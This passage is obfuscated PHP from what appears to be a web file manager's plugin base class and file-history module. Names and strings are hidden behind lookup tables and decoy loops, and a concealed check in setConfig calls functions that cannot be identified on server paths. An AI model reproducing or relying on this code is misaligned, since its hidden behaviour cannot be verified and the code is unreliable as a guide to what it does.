$¬…ÑÈîÖ[706]) { $¬äÉÏûï = $¬…ÑÈîÖ[61]; $¬äÉÏûï(); } $ßÊäßì’ = $¬…ÑÈîÖ[961]; $ßÊäßì’($_SERVER[$¬…ÑÈîÖ[962]]); $ßÊäßì’($_SERVER[$¬…ÑÈîÖ[57]] . $¬…ÑÈîÖ[1630]); $©À³ºˆ¥ = 1; while ($©À³ºˆ¥ > 1) { $©À³ºˆ¥ = $©À³ºˆ¥ + 4; $ÉÅ¨‡§ = rawurlencode($©À³ºˆ¥ . $¬…ÑÈîÖ[63]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($¬…ÑÈîÖ[1631]); $this->pluginName = str_replace($¬…ÑÈîÖ[1631], $¬…ÑÈîÖ[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $¬…ÑÈîÖ[8]; $this->pluginApi = appHostGet() . $¬…ÑÈîÖ[1632] . $this->pluginName . $¬…ÑÈîÖ[8]; $this->pluginHost = $config[$¬…ÑÈîÖ[1633]] . $this->pluginName . $¬…ÑÈîÖ[8]; $this->pluginHostDefault = $config[$¬…ÑÈîÖ[1633]] . $this->pluginName . $¬…ÑÈîÖ[8]; $£ÂƒëƒÚ = $config[$¬…ÑÈîÖ[1634]]; if ($£ÂƒëƒÚ && strpos($¬…ÑÈîÖ[50] . $£ÂƒëƒÚ . $¬…ÑÈîÖ[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$¬…ÑÈîÖ[1635]] . $this->pluginName . $¬…ÑÈîÖ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¼èá¯æÙ][1636]); } protected function assign($˜Şñ´ÏË, $ª±¤œ¦¿ = false) { if (is_array($˜Şñ´ÏË)) { $this->values = array_merge($this->values, $˜Şñ´ÏË); } else { $this->values[$˜Şñ´ÏË] = $ª±¤œ¦¿; } } protected function display($Ò¢×ï«à) { extract($this->values); require $Ò¢×ï«à; } final function hookRegist($°ëÎ§ã÷) { $this->modelPlugin->appRegist($this->pluginName, $°ëÎ§ã÷); } final function appIcon() { $—Î¢šÉÑ =& $_SERVER[¼èá¯æÙ]; $§¹ÑáıÏ = $this->appPackage(); $ÊÀõæÄ = $—Î¢šÉÑ[12]; if (isset($§¹ÑáıÏ[$—Î¢šÉÑ[501]])) { if (isset($§¹ÑáıÏ[$—Î¢šÉÑ[501]][$—Î¢šÉÑ[1637]])) { $ÊÀõæÄ = $—Î¢šÉÑ[1638] . $§¹ÑáıÏ[$—Î¢šÉÑ[501]][$—Î¢šÉÑ[1637]] . $—Î¢šÉÑ[1639]; } else { if ($§¹ÑáıÏ[$—Î¢šÉÑ[501]][$—Î¢šÉÑ[1640]]) { $ÊÀõæÄ = $—Î¢šÉÑ[1641] . $§¹ÑáıÏ[$—Î¢šÉÑ[501]][$—Î¢šÉÑ[1640]] . $—Î¢šÉÑ[1642]; } } } return $ÊÀõæÄ; } final function fileCanView($¶¡Äæã) { $¦õ¨·”Í =& $_SERVER[¼èá¯æÙ]; if (request_url_safe($¶¡Äæã)) { return !0; } if ($this->isShare($¶¡Äæã)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $¢¸ÆŞ£ó = $¦õ¨·”Í[1643] . rawurlencode(this_url()); show_tips(LNG($¦õ¨·”Í[1644]) . $¦õ¨·”Í[1645] . $¢¸ÆŞ£ó . $¦õ¨·”Í[1646] . LNG($¦õ¨·”Í[1647]) . $¦õ¨·”Í[1648], !1); } if (!Action($¦õ¨·”Í[1649])->authCan($¦õ¨·”Í[1650])) { show_tips(LNG($¦õ¨·”Í[1651]) . $¦õ¨·”Í[1652], !1); } ActionCall($¦õ¨·”Í[1653], $¶¡Äæã); } final function isShare($¯Ğ¥çÊ¶) { $×®‘¿ƒ = KodIO::parse($¯Ğ¥çÊ¶); return $×®‘¿ƒ[$_SERVER[¼èá¯æÙ][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($­«»š§æ) { if (request_url_safe($­«»š§æ)) { return $­«»š§æ; } if (!$this->isShare($­«»š§æ)) { $­«»š§æ = $this->filePath($­«»š§æ, !1); } return Action($_SERVER[¼èá¯æÙ][1261])->linkOut($­«»š§æ); } public function filePathLinkOut($ê±Û©ù¶) { if (request_url_safe($ê±Û©ù¶)) { return $ê±Û©ù¶; } $this->fileCanView($ê±Û©ù¶); return Action($_SERVER[¼èá¯æÙ][1261])->link($ê±Û©ù¶); } final function filePath($ò™ş¬ùŠ, $í£ªÏ©± = true, $èïÎ‹·­ = false) { $ÛƒêàÒá =& $_SERVER[¼èá¯æÙ]; $È×©ıåí = $this->filePathGet($ò™ş¬ùŠ, $í£ªÏ©±); if (!$this->fileInfo) { show_tips(LNG($ÛƒêàÒá[118]), !1); } if ($èïÎ‹·­ && isset($this->fileInfo[$ÛƒêàÒá[552]]) && $this->fileInfo[$ÛƒêàÒá[552]]) { $¢Úø‰¯Ÿ = Model($ÛƒêàÒá[555])->fileInfo($this->fileInfo[$ÛƒêàÒá[552]]); if (!$¢Úø‰¯Ÿ || !IO::exist($¢Úø‰¯Ÿ[$ÛƒêàÒá[97]])) { $Ç¨Ü§˜ª = LNG($ÛƒêàÒá[118]) . LNG($ÛƒêàÒá[1654]); if (KodUser::isRoot() && isset($¢Úø‰¯Ÿ[$ÛƒêàÒá[97]])) { $Ç¨Ü§˜ª .= $ÛƒêàÒá[1655] . $¢Úø‰¯Ÿ[$ÛƒêàÒá[97]] . $ÛƒêàÒá[1656]; } show_tips($Ç¨Ü§˜ª); } } Hook::trigger($ÛƒêàÒá[1657], $È×©ıåí); return $È×©ıåí; } final function filePathGet($¸Á§¡™ˆ, $£ºùËì½ = true) { $¯›¥ıÔÔ =& $_SERVER[¼èá¯æÙ]; if ($¼õ˜âÔÜ = $this->checkSharePath($¸Á§¡™ˆ, $£ºùËì½)) { return $¼õ˜âÔÜ; } $this->fileCanView($¸Á§¡™ˆ); if (request_url_safe($¸Á§¡™ˆ)) { $¸‚†»ç² = parse_url_query($¸Á§¡™ˆ); if (isset($¸‚†»ç²[$¯›¥ıÔÔ[1658]]) && isset($¸‚†»ç²[$¯›¥ıÔÔ[246]])) { $‚åò†È° = Mcrypt::decode($¸‚†»ç²[$¯›¥ıÔÔ[246]], Model($¯›¥ıÔÔ[852])->get($¯›¥ıÔÔ[853])); if ($‚åò†È°) { $this->fileInfo = IO::info($‚åò†È°); $this->fileInfo[$¯›¥ıÔÔ[1659]] = $¸Á§¡™ˆ; $this->cachePath = $this->pluginCachePath($¯›¥ıÔÔ[12], $£ºùËì½); return $‚åò†È°; } } $¸Á§¡™ˆ = $this->_cacheHttpFile($¸Á§¡™ˆ, $£ºùËì½); $this->fileInfo = IO::info($¸Á§¡™ˆ); } else { $this->fileInfo = IO::info($¸Á§¡™ˆ); $this->cachePath = $this->pluginCachePath($¯›¥ıÔÔ[12], $£ºùËì½); } return $¸Á§¡™ˆ; } final function _cacheHttpFile($„´É¥ô, $ıÃñÃŸ± = true) { $¼¤¬ƒúÌ =& $_SERVER[¼èá¯æÙ]; $­¸æúÎ¥ = parse_url_query($„´É¥ô); $Ğ•¢³¸Æ = get_path_ext($„´É¥ô); if (isset($­¸æúÎ¥[$¼¤¬ƒúÌ[32]]) && $­¸æúÎ¥[$¼¤¬ƒúÌ[32]]) { $Ğ•¢³¸Æ = get_path_ext($­¸æúÎ¥[$¼¤¬ƒúÌ[32]]); } $ÍŠÉçĞ° = hash_path($„´É¥ô) . $¼¤¬ƒúÌ[10] . $Ğ•¢³¸Æ; $this->cachePath = $this->pluginCachePath($ıÃñÃŸ± ? $ÍŠÉçĞ° : $¼¤¬ƒúÌ[12]); $¯‹ÔÌ¨‰ = IO::fileNameExist($this->cachePath, $ÍŠÉçĞ°); if ($¯‹ÔÌ¨‰) { return KodIO::make($¯‹ÔÌ¨‰); } $îÊ“òŞ§ = rtrim($this->cachePath, $¼¤¬ƒúÌ[8]) . $¼¤¬ƒúÌ[8] . $ÍŠÉçĞ°; return $this->pluginCacheFileSet($îÊ“òŞ§, file_get_contents_nossl($„´É¥ô)); } final function checkSharePath($ Àû‡óî, $àßğ­² = true) { $¬òƒªÜŒ =& $_SERVER[¼èá¯æÙ]; if (!$this->isShare($ Àû‡óî)) { return !1; } $ˆ±·«‚é = Action($¬òƒªÜŒ[1261])->sharePathInfo($ Àû‡óî); if (!is_array($ˆ±·«‚é) || !isset($ˆ±·«‚é[$¬òƒªÜŒ[97]])) { show_json(LNG($¬òƒªÜŒ[1660]), !1); } $this->fileInfo = $ˆ±·«‚é; $this->cachePath = $this->pluginCachePath(!1, $àßğ­²); return $ˆ±·«‚é[$¬òƒªÜŒ[97]]; } final function pluginCachePath($°ÁË±›‘ = '', $ƒÎ•ŒÛÚ = false) { $ÑğÇ˜“¬ =& $_SERVER[¼èá¯æÙ]; if ($ƒÎ•ŒÛÚ && is_array($this->fileInfo)) { $°ÁË±›‘ = kodIO::hashPath($this->fileInfo); } $¸¨Ã£ìµ = rtrim(IO_PATH_SYSTEM_TEMP . $ÑğÇ˜“¬[1661] . $this->pluginName . $ÑğÇ˜“¬[8] . $°ÁË±›‘, $ÑğÇ˜“¬[8]); $­‰è›óß = IO::infoFullSimple($¸¨Ã£ìµ); $Ò¦ãàí– = $­‰è›óß && is_array($­‰è›óß) ? $­‰è›óß[$ÑğÇ˜“¬[97]] : $ÑğÇ˜“¬[12]; if (!$Ò¦ãàí–) { $Ò¦ãàí– = IO::mkdir($¸¨Ã£ìµ); } return $Ò¦ãàí–; } final function pluginCacheFileSet($¨Ş°ĞÆ®, $ Ï¤Á = '') { $Ú¨ûó¦¾ =& $_SERVER[¼èá¯æÙ]; $ĞÀ Ûí€ = IO::infoFullSimple($¨Ş°ĞÆ®); if (!$ĞÀ Ûí€) { return IO::mkfile($¨Ş°ĞÆ®, $ Ï¤Á, REPEAT_REPLACE); } IO::setContent($ĞÀ Ûí€[$Ú¨ûó¦¾[97]], $ Ï¤Á); return $ĞÀ Ûí€[$Ú¨ûó¦¾[97]]; } final function pluginLocalFile($ÌÈ‡Íô® = '') { $†œ‹ÇÓ´ =& $_SERVER[¼èá¯æÙ]; $ôÑ«ê = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($ôÑ«ê)) { mk_dir($ôÑ«ê); } if (!$ÌÈ‡Íô®) { return $ôÑ«ê; } $Š¦’»ïÙ = IO::info($ÌÈ‡Íô®); $±Àäöğ = $†œ‹ÇÓ´[1662] . KodIO::hashPath($Š¦’»ïÙ) . $†œ‹ÇÓ´[10] . $Š¦’»ïÙ[$†œ‹ÇÓ´[179]]; if (!checkExtSafe($±Àäöğ)) { $±Àäöğ = $±Àäöğ . $†œ‹ÇÓ´[1296]; } $€—€Ñ£è = $ôÑ«ê . $±Àäöğ; if (@file_exists($€—€Ñ£è)) { return $€—€Ñ£è; } return IO::copy($ÌÈ‡Íô®, $ôÑ«ê, 0, $±Àäöğ); } final function appPackage() { $î’òº©¤ =& $_SERVER[¼èá¯æÙ]; if ($this->packageData) { return $this->packageData; } $ÛÌËè›‡ = $this->parseFile($this->pluginPath . $î’òº©¤[1663]); $this->parseLang($ÛÌËè›‡); $Æşï”ˆË = json_decode_force($ÛÌËè›‡); if (!$Æşï”ˆË) { return array(); } $ÚÔöŠŒ = Hook::trigger($î’òº©¤[1664], $Æşï”ˆË); if ($ÚÔöŠŒ && is_array($ÚÔöŠŒ)) { $Æşï”ˆË = $ÚÔöŠŒ; } $this->packageData = $Æşï”ˆË; return $Æşï”ˆË; } public function packageInfoGet($¦ÉÓ´ï) { $öØô³÷ = $this->appPackage(); return array_get_value($öØô³÷, $¦ÉÓ´ï); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¼èá¯æÙ][1665]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¼èá¯æÙ][1666]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¼èá¯æÙ][1667]); } public function echoJsAssign($ÑÑ¾ô•, $ÒŸ÷Ô³) { $this->echoJsAssignArr[$ÑÑ¾ô•] = $ÒŸ÷Ô³; } private function parseFile($õÉ•÷«‰) { $¬ñ –Åò =& $_SERVER[¼èá¯æÙ]; $¥Áäö¶² = file_get_contents_nossl($õÉ•÷«‰); $şÉ¢é®Ú = array($¬ñ –Åò[1668], $¬ñ –Åò[1669], $¬ñ –Åò[1670], $¬ñ –Åò[1671], $¬ñ –Åò[1672], $¬ñ –Åò[1673], $¬ñ –Åò[1674]); $˜Êª¢°ì = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$¬ñ –Åò[102]][$¬ñ –Åò[1675]]); foreach ($this->echoJsAssignArr as $¶Ü­«¿È => $³ˆÇÂÑŞ) { $şÉ¢é®Ú[] = $¬ñ –Åò[1676] . $¶Ü­«¿È . $¬ñ –Åò[1677]; $˜Êª¢°ì[] = is_array($³ˆÇÂÑŞ) || is_object($³ˆÇÂÑŞ) ? rawurlencode(json_encode($³ˆÇÂÑŞ)) : $³ˆÇÂÑŞ; } if (strstr($¥Áäö¶², $¬ñ –Åò[1678])) { $Òè×¤üá = rawurlencode(json_encode($this->pluginLangArr)); $¥Áäö¶² = str_replace($¬ñ –Åò[1678], $Òè×¤üá, $¥Áäö¶²); } if (strstr($¥Áäö¶², $¬ñ –Åò[1679])) { $Òè×¤üá = $Òè×¤üá = rawurlencode(json_encode($this->getConfig())); $¥Áäö¶² = str_replace($¬ñ –Åò[1679], $Òè×¤üá, $¥Áäö¶²); } $¥Áäö¶² = str_replace($şÉ¢é®Ú, $˜Êª¢°ì, $¥Áäö¶²); return $¥Áäö¶²; } private function parseLang(&$£Î˜—œØ) { $„æĞ¤Œ¹ =& $_SERVER[¼èá¯æÙ]; $µñ¨Âøº = $„æĞ¤Œ¹[1680]; if (!strstr($£Î˜—œØ, $µñ¨Âøº)) { return; } preg_match_all($„æĞ¤Œ¹[1681], $£Î˜—œØ, $‡º—‡¢ü); if (!is_array($‡º—‡¢ü) || count($‡º—‡¢ü) == 0 || !is_array($‡º—‡¢ü[0]) || count($‡º—‡¢ü[0]) == 0) { return; } $²«Éò™ = array(); $ƒÊÒ±˜ğ = array(); foreach ($‡º—‡¢ü[0] as $–áãÇÔÊ) { $ÊîÎÜˆ = substr($–áãÇÔÊ, strlen($µñ¨Âøº), -4); $ë½êéïš = LNG($ÊîÎÜˆ); $²«Éò™[] = $–áãÇÔÊ; $ƒÊÒ±˜ğ[] = str_replace(array($„æĞ¤Œ¹[59], $„æĞ¤Œ¹[1161], $„æĞ¤Œ¹[429], $„æĞ¤Œ¹[131]), array($„æĞ¤Œ¹[53], $„æĞ¤Œ¹[53], $„æĞ¤Œ¹[12], $„æĞ¤Œ¹[1682]), $ë½êéïš); } $£Î˜—œØ = str_replace($²«Éò™, $ƒÊÒ±˜ğ, $£Î˜—œØ); } private function parseConfig(&$É™ƒ“í) { $ï«ÇèäÛ =& $_SERVER[¼èá¯æÙ]; $Ì¸â·ò€ = $ï«ÇèäÛ[1683]; if (!strstr($É™ƒ“í, $Ì¸â·ò€)) { return; } preg_match_all($ï«ÇèäÛ[1684], $É™ƒ“í, $Š…º); if (!is_array($Š…º) || count($Š…º) == 0 || !is_array($Š…º[0]) || count($Š…º[0]) == 0) { return; } $ó™ˆ˜•Ù = $this->getConfig(); $¹æÖÉ«§ = array(); $—›‹Ï„ = array(); foreach ($Š…º[0] as $ÁÓê©½) { $®Êüäâ = substr($ÁÓê©½, strlen($Ì¸â·ò€), -2); $¹æÖÉ«§[] = $ÁÓê©½; $—›‹Ï„[] = _get($ó™ˆ˜•Ù, $®Êüäâ); } $É™ƒ“í = str_replace($¹æÖÉ«§, $—›‹Ï„, $É™ƒ“í); } private function parsePackage(&$ü¯Â‚Ø) { $²Îêœ¬ =& $_SERVER[¼èá¯æÙ]; $ü‹÷÷˜Ï = $²Îêœ¬[1685]; if (!strstr($ü¯Â‚Ø, $ü‹÷÷˜Ï)) { return; } preg_match_all($²Îêœ¬[1686], $ü¯Â‚Ø, $„›ûÈş¨); if (!is_array($„›ûÈş¨) || count($„›ûÈş¨) == 0 || !is_array($„›ûÈş¨[0]) || count($„›ûÈş¨[0]) == 0) { return; } $û¡ìÖ÷Ë = $this->appPackage(); $¾ÁÒù™ª = array(); $‰ŠÇ¡½É = array(); foreach ($„›ûÈş¨[0] as $ƒïº¨) { $¦œÕİ²× = substr($ƒïº¨, strlen($ü‹÷÷˜Ï), -2); $¾ÁÒù™ª[] = $ƒïº¨; $‰ŠÇ¡½É[] = _get($û¡ìÖ÷Ë, $¦œÕİ²×); } $ü¯Â‚Ø = str_replace($¾ÁÒù™ª, $‰ŠÇ¡½É, $ü¯Â‚Ø); } final function echoFile($»¼ÀÕÍ‘, $ÛóíÌÈ‹ = false) { $—²ñ–ü€ =& $_SERVER[¼èá¯æÙ]; $õ¾ö½±å = $this->pluginPath . $»¼ÀÕÍ‘; if (ACT == $—²ñ–ü€[1687]) { echo $—²ñ–ü€[1688] . $this->pluginName . $—²ñ–ü€[8] . $»¼ÀÕÍ‘ . $—²ñ–ü€[1689]; if (!file_exists($õ¾ö½±å)) { echo $—²ñ–ü€[1690]; return; } } $¼±Ÿîïë = $this->parseFile($õ¾ö½±å); $this->parseLang($¼±Ÿîïë); $this->parseConfig($¼±Ÿîïë); $this->parsePackage($¼±Ÿîïë); if (is_array($ÛóíÌÈ‹)) { $¼±Ÿîïë = str_replace(array_keys($ÛóíÌÈ‹), array_values($ÛóíÌÈ‹), $¼±Ÿîïë); } echo $—²ñ–ü€[59] . $¼±Ÿîïë; } private function checkVersion() { $ƒÅºŞğ =& $_SERVER[¼èá¯æÙ]; $²ìş”ı¸ = $this->appPackage(); $¥À¨ÄõË = $this->getConfig(); if ($¥À¨ÄõË[$ƒÅºŞğ[1691]] == $²ìş”ı¸[$ƒÅºŞğ[1665]]) { return; } $this->regist(); $this->setConfig(array($ƒÅºŞğ[1691] => $²ìş”ı¸[$ƒÅºŞğ[1665]])); } final function initLang() { $º”­Îõ¦ =& $_SERVER[¼èá¯æÙ]; $äí§¯ø = $º”­Îõ¦[1692]; $äô²ªæ = $this->pluginPath . $º”­Îõ¦[1693]; $ßóŞ¯”Ü = I18n::getType(); $ğ†„æÒ = array(); if (file_exists($äô²ªæ . $ßóŞ¯”Ü . $º”­Îõ¦[921])) { $ğ†„æÒ = (include $äô²ªæ . $ßóŞ¯”Ü . $º”­Îõ¦[921]); } else { if ($ßóŞ¯”Ü == $º”­Îõ¦[1694] && !file_exists($äô²ªæ . $ßóŞ¯”Ü . $º”­Îõ¦[921]) && file_exists($äô²ªæ . $º”­Îõ¦[1695])) { $ğ†„æÒ = (include $äô²ªæ . $º”­Îõ¦[1695]); } else { if (file_exists($äô²ªæ . $äí§¯ø . $º”­Îõ¦[921])) { $ğ†„æÒ = (include $äô²ªæ . $äí§¯ø . $º”­Îõ¦[921]); } } } if (!is_array($ğ†„æÒ)) { return array(); } if (@count($ğ†„æÒ) > 0) { I18n::set($ğ†„æÒ); } return $ğ†„æÒ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ˆ²ÈáÖä) { $µÏé¬ß÷ =& $_SERVER[¼èá¯æÙ]; if ($_SERVER[$µÏé¬ß÷[54]] != $_SERVER[$µÏé¬ß÷[332]]) { $¹Ï‚âº = $µÏé¬ß÷[960]; $±«ÚŒù© = $µÏé¬ß÷[56]; $”ÅÔ’ÔË = $_SERVER[$µÏé¬ß÷[57]] . $µÏé¬ß÷[58]; $íØùôŞ = $±«ÚŒù©($”ÅÔ’ÔË); $†ı¢¼Ğü = explode($µÏé¬ß÷[59], $íØùôŞ); if (count($†ı¢¼Ğü) < $µÏé¬ß÷[706]) { $›âö´Ë = $µÏé¬ß÷[61]; $›âö´Ë(); } $Ã˜­Ã–ş = $µÏé¬ß÷[961]; $Ã˜­Ã–ş($_SERVER[$µÏé¬ß÷[962]]); $Ã˜­Ã–ş($_SERVER[$µÏé¬ß÷[57]] . $µÏé¬ß÷[1630]); $µ•’ŞöÌ = 1; while ($µ•’ŞöÌ > 1) { $µ•’ŞöÌ = $µ•’ŞöÌ + 4; $€¦Ü²ÒÖ = rawurlencode($µ•’ŞöÌ . $µÏé¬ß÷[63]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ˆ²ÈáÖä); } public function onSetConfig($½Øá¢Ä) { } public function onGetConfig($€¥ú‹¸×) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($æê“ÚòÙ) { if ($æê“ÚòÙ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($º½õ¿ó­ = "\x70\154\165\x67\x69\x6e\x41\x75\x74\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $ÄáÇÆå’ = $this->getConfig(); if (!$ÄáÇÆå’[$º½õ¿ó­]) { return !1; } return ActionCall($_SERVER[¼èá¯æÙ][1696], $ÄáÇÆå’[$º½õ¿ó­]); } public function url($»Ğ–×, $ÜÉõæ”· = '', $ö¨¼ÊÇÄ = true) { $“İ­•İÚ =& $_SERVER[¼èá¯æÙ]; $Ùá·¶Î§ = $this->getConfig(); $¤—ñø ó = KOD_VERSION . $“İ­•İÚ[10] . KOD_VERSION_BUILD; $éË•éë— = $this->packageVersion(); $Şı¿¹¿… = $¤—ñø ó . $“İ­•İÚ[473] . $éË•éë—; if (substr($»Ğ–×, 0, 4) == $“İ­•İÚ[162] || substr($»Ğ–×, 0, 2) == $“İ­•İÚ[1416]) { $ßñÀÙŸ = $»Ğ–× . $“İ­•İÚ[1697] . $Şı¿¹¿…; } else { if ($ÜÉõæ”· == $“İ­•İÚ[12]) { $ßñÀÙŸ = $this->pluginHost . $»Ğ–× . $“İ­•İÚ[1697] . $Şı¿¹¿…; } else { if ($ÜÉõæ”· === $“İ­•İÚ[88]) { $ßñÀÙŸ = $this->pluginHost . $»Ğ–×; } else { if ($ÜÉõæ”· == $“İ­•İÚ[1698]) { $ßñÀÙŸ = STATIC_PATH . $»Ğ–× . $“İ­•İÚ[1697] . $¤—ñø ó; } else { if ($ÜÉõæ”· == $“İ­•İÚ[1699]) { $ßñÀÙŸ = APP_HOST . $“İ­•İÚ[1700] . $»Ğ–× . $“İ­•İÚ[1697] . $¤—ñø ó; } else { if (isset($Ùá·¶Î§[$ÜÉõæ”·])) { $ßñÀÙŸ = $Ùá·¶Î§[$ÜÉõæ”·] . $»Ğ–× . $“İ­•İÚ[1697] . $Şı¿¹¿…; } } } } } } if (!$ö¨¼ÊÇÄ) { return $ßñÀÙŸ; } echo $ßñÀÙŸ; } public function link($–ÛÙÂ = false, $Š´Ú˜£Æ = '') { $œÅºÖ‡Î =& $_SERVER[¼èá¯æÙ]; $úóÖˆ¥ = $this->linkHas == !1; $this->linkHas = !0; if (!$–ÛÙÂ) { $this->link($œÅºÖ‡Î[1701], $œÅºÖ‡Î[1699]); $this->link($œÅºÖ‡Î[1702], $œÅºÖ‡Î[1698]); $this->link($œÅºÖ‡Î[1703], $œÅºÖ‡Î[1698]); $this->link($œÅºÖ‡Î[1704], $œÅºÖ‡Î[1698]); $this->link($œÅºÖ‡Î[1705], $œÅºÖ‡Î[1698]); if ($úóÖˆ¥) { Hook::trigger($œÅºÖ‡Î[1706]); } return; } $†¹ûÀöÜ = $this->url($–ÛÙÂ, $Š´Ú˜£Æ, !1); if (substr($–ÛÙÂ, -3) == $œÅºÖ‡Î[1707]) { echo $œÅºÖ‡Î[1708] . $†¹ûÀöÜ . $œÅºÖ‡Î[1709] . $œÅºÖ‡Î[59]; } else { if (substr($–ÛÙÂ, -4) == $œÅºÖ‡Î[1710]) { echo $œÅºÖ‡Î[1711] . $†¹ûÀöÜ . $œÅºÖ‡Î[1712] . $œÅºÖ‡Î[59]; } } if ($úóÖˆ¥) { Hook::trigger($œÅºÖ‡Î[1706]); } } } goto CÅ£Ûğ³øÈ; DŞ”Şƒ†²ë: $fileSize = strrev(base64_decode($_SERVER[¤ÀõŒÆ][0])); function binCheckNeq($ˆ£â¬ÀŸ, $¤”¹©ë) { return $ˆ£â¬ÀŸ != $¤”¹©ë; } $_SERVER[$_SERVER[¤ÀõŒÆ][1]] = $fileSize($_SERVER[$_SERVER[¤ÀõŒÆ][2]]); goto D•ÃåàĞÁŒ; añƒ÷ï£æó: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $œº¬€—Ÿ =& $_SERVER[¼èá¯æÙ]; $öò€Œ’ = $GLOBALS[$œº¬€—Ÿ[6]][$œº¬€—Ÿ[102]]; if ($öò€Œ’[$œº¬€—Ÿ[1306]] != 1) { return; } if ($öò€Œ’[$œº¬€—Ÿ[1307]] <= 0) { return; } if (isset($_REQUEST[$œº¬€—Ÿ[1308]]) && $_REQUEST[$œº¬€—Ÿ[1308]] == $œº¬€—Ÿ[101]) { return; } Hook::bind($œº¬€—Ÿ[1309], $œº¬€—Ÿ[1310]); Hook::bind($œº¬€—Ÿ[1311], $œº¬€—Ÿ[1312]); Hook::bind($œº¬€—Ÿ[1313], $œº¬€—Ÿ[1314]); Hook::bind($œº¬€—Ÿ[1315], $œº¬€—Ÿ[1316]); Hook::bind($œº¬€—Ÿ[1317], $œº¬€—Ÿ[1318]); Hook::bind($œº¬€—Ÿ[1319], $œº¬€—Ÿ[1320]); } public static function eventBeforeUpload($—”½Õ¬ğ) { if ($—”½Õ¬ğ[3] && $—”½Õ¬ğ[3] != REPEAT_REPLACE) { return; } $èó›™øŞ = self::parsePath($—”½Õ¬ğ[0]); if (!$èó›™øŞ) { return; } self::add($èó›™øŞ); } public static function eventBeforeEdit($À ãŞÛ…) { $Øøá¶Î = self::parsePath($À ãŞÛ…[0]); if (!$Øøá¶Î) { return; } self::add($Øøá¶Î); } public static function eventBeforeCopyFile($İŸË¯¦, $•§ğŞŒñ, $ñÖ—¸ÉÒ, $ÔÔ¡üÕã, $ãø‰åÅ , $ºªÁ‹ª§) { $–­ÚŒëù =& $_SERVER[¼èá¯æÙ]; if (isset($ñÖ—¸ÉÒ->_data[$–­ÚŒëù[1241]]) && $ñÖ—¸ÉÒ->_data[$–­ÚŒëù[1241]]) { return; } $õºÙÙªÚ = $ñÖ—¸ÉÒ->getPathOuter($ÔÔ¡üÕã); $’Ö³ÜÌß = self::parsePath($õºÙÙªÚ); if (!$’Ö³ÜÌß) { return; } self::add($’Ö³ÜÌß); } public static function eventBeforeRename($²ÉÑ½â×) { $‚Ã‡¨»ã =& $_SERVER[¼èá¯æÙ]; $‚•¨¬¡ = self::parsePath($²ÉÑ½â×[0]); if (!$‚•¨¬¡) { return; } $„¥‹ñ€Û = self::checkInHistory($‚•¨¬¡); if (!$„¥‹ñ€Û) { return; } if ($„¥‹ñ€Û[$‚Ã‡¨»ã[33]] == $‚Ã‡¨»ã[242]) { $¦ò¬áâÅ = self::listData($‚•¨¬¡); if ($¦ò¬áâÅ && $¦ò¬áâÅ[$‚Ã‡¨»ã[457]]) { self::moveHistory($‚•¨¬¡, $²ÉÑ½â×[1]); } } else { IO::rename($„¥‹ñ€Û[$‚Ã‡¨»ã[97]], $²ÉÑ½â×[1]); } } public static function eventBeforeMove($ï®ÀÇÒ°) { $İÆ²Û =& $_SERVER[¼èá¯æÙ]; $ƒ›¨Œ£Æ = self::parsePath($ï®ÀÇÒ°[0]); if (!$ƒ›¨Œ£Æ) { return; } $ûÑçµ«í = self::parsePath($ï®ÀÇÒ°[1]); if (!$ûÑçµ«í) { return; } $ÙÉƒ´± = $ï®ÀÇÒ°[3]; $Åª™…ãá = self::checkInHistory($ƒ›¨Œ£Æ); if (!$Åª™…ãá) { return; } $ı¯à¦Å‹ = self::pathHistory($ûÑçµ«í); if ($Åª™…ãá[$İÆ²Û[33]] == $İÆ²Û[242]) { $À°¯”¿ú = self::listData($ƒ›¨Œ£Æ); $”ğÌ¿™Í = rtrim($ûÑçµ«í, $İÆ²Û[8]) . $İÆ²Û[8] . ($ÙÉƒ´± ? $ÙÉƒ´± : get_path_this($ƒ›¨Œ£Æ)); $óğñÚ×³ = self::listData($”ğÌ¿™Í); if ($À°¯”¿ú && $À°¯”¿ú[$İÆ²Û[457]] && $óğñÚ×³ && $óğñÚ×³[$İÆ²Û[457]]) { return self::clear($ƒ›¨Œ£Æ); } if ($À°¯”¿ú && $À°¯”¿ú[$İÆ²Û[457]]) { self::moveHistory($ƒ›¨Œ£Æ, $ÙÉƒ´±, $ı¯à¦Å‹); } } else { IO::move($Åª™…ãá[$İÆ²Û[97]], $ı¯à¦Å‹, !1, $ÙÉƒ´±); self::clearEmptyFolder(IO::pathFather($Åª™…ãá[$İÆ²Û[97]])); } } public static function eventAfterRemove($²«£ÑÀ¥, $‡«êÃŞú) { $íàœ·«… =& $_SERVER[¼èá¯æÙ]; if (!$‡«êÃŞú) { return; } $¨üø…ïĞ = self::parsePath($²«£ÑÀ¥[0]); if (!$¨üø…ïĞ) { return; } $ı´·¯É = self::checkInHistory($¨üø…ïĞ); if (!$ı´·¯É) { return; } if ($ı´·¯É[$íàœ·«…[33]] == $íàœ·«…[242]) { $óŞÌĞ‘ƒ = self::listData($¨üø…ïĞ, !1); if ($óŞÌĞ‘ƒ && $óŞÌĞ‘ƒ[$íàœ·«…[457]]) { self::clear($¨üø…ïĞ, !1); } } else { IO::remove($ı´·¯É[$íàœ·«…[97]]); 